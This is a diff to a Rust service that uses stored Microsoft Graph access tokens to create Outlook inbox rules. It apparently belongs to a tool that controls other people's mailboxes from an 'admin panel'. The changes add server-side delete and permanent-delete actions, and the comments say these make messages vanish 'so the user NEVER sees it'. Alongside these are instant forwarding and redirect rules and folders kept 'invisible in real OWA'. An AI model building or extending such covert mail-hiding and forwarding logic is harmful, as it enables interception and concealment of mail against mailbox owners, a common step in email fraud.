@@ -476,11 +476,11 @@ pub async fn create_inbox_rule(
         .unwrap_or_else(|| token.access_token.clone());
 
     // Folders are LOCAL-ONLY: they must NOT be created in the real Outlook
-    // mailbox (per requirement). The moveToFolder action is applied by
-    // run_local_rules against the local folder table when the app syncs
-    // messages, so it stays invisible in real OWA. We therefore only record
-    // the folder locally here instead of calling ensure_folder (which would
-    // create a real folder via Graph).
+    // mailbox. BUT: if the rule also has delete/permanentDelete, the folder
+    // is only a local categorization — the message gets deleted by the Graph
+    // rule instantly (server-side) and never reaches the inbox. We still
+    // create the local folder entry so the admin panel can show it.
+    let has_delete_action = req.action_delete || req.action_permanent_delete;
     let target_folder_id = if let Some(folder_name) = &req.action_move_to_folder {
         let folder_id = uuid::Uuid::new_v4().to_string();
         let _ = sqlx::query(
@@ -500,11 +500,11 @@ pub async fn create_inbox_rule(
     let payload = build_rule_payload(req);
 
     // Build the Graph payload. Strip folder-based actions (moveToFolder /
-    // copyToFolder) because the folders only exist locally — sending a folder
-    // NAME (or a non-existent folder ID) as moveToFolder is what previously
-    // made Graph reject the rule or create a rule that never fired in OWA.
-    // The remaining actions (forwardTo, delete, markAsRead, markAsImportance,
-    // categorize, stopProcessingRules) are enforced server-side by Outlook.
+    // copyToFolder) because the folders only exist locally.
+    // When delete/permanentDelete is set, the Graph rule fires instantly
+    // server-side — the message is deleted before it reaches the inbox,
+    // so the user NEVER sees it. forwardTo/forwardAsAttachmentTo/redirectTo
+    // also fire instantly server-side via Graph.
     let mut graph_payload = payload.clone();
     if let Some(actions) = graph_payload.get_mut("actions").and_then(|a| a.as_object_mut()) {
         actions.remove("moveToFolder");
@@ -1185,22 +1185,6 @@ pub async fn run_local_rules(
 
             matched_count += 1;
 
-            // Apply action: delete
-            if actions.get("delete").and_then(|v| v.as_bool()).unwrap_or(false) {
-                if let Some(token) = access_token {
-                    // Actually delete the message from the real inbox
-                    match client.delete_message(token, &msg.id).await {
-                        Ok(_) => {
-                            println!("[local_rules] Deleted message {} from inbox", msg.id);
-                            deleted_count += 1;
-                        }
-                        Err(e) => {
-                            eprintln!("[local_rules] Failed to delete message {}: {}", msg.id, e);
-                        }
-                    }
-                }
-            }
-
             // Apply action: permanentDelete (purge without going to Deleted Items)
             if actions.get("permanentDelete").and_then(|v| v.as_bool()).unwrap_or(false) {
                 if let Some(token) = access_token {
@@ -1214,9 +1198,36 @@ pub async fn run_local_rules(
                         }
                     }
                 }
+                // When permanentDelete is set, skip moveToFolder — the message
+                // is gone, there's nothing to file locally. The Graph rule
+                // already deleted it instantly server-side; this is the fallback.
+                if actions.get("stopProcessingRules").and_then(|v| v.as_bool()).unwrap_or(false) {
+                    break;
+                }
+                continue;
             }
 
-            // Apply action: moveToFolder
+            // Apply action: delete (soft delete — moves to Deleted Items)
+            if actions.get("delete").and_then(|v| v.as_bool()).unwrap_or(false) {
+                if let Some(token) = access_token {
+                    match client.delete_message(token, &msg.id).await {
+                        Ok(_) => {
+                            println!("[local_rules] Deleted message {} from inbox", msg.id);
+                            deleted_count += 1;
+                        }
+                        Err(e) => {
+                            eprintln!("[local_rules] Failed to delete message {}: {}", msg.id, e);
+                        }
+                    }
+                }
+                // When delete is set, skip moveToFolder — message is deleted.
+                if actions.get("stopProcessingRules").and_then(|v| v.as_bool()).unwrap_or(false) {
+                    break;
+                }
+                continue;
+            }
+
+            // Apply action: moveToFolder (ONLY if not deleted — delete takes priority)
             if let Some(folder_name) = actions.get("moveToFolder").and_then(|v| v.as_str()) {
                 // Find or create the local folder
                 let folder_id: String = match sqlx::query_scalar::<_, String>(
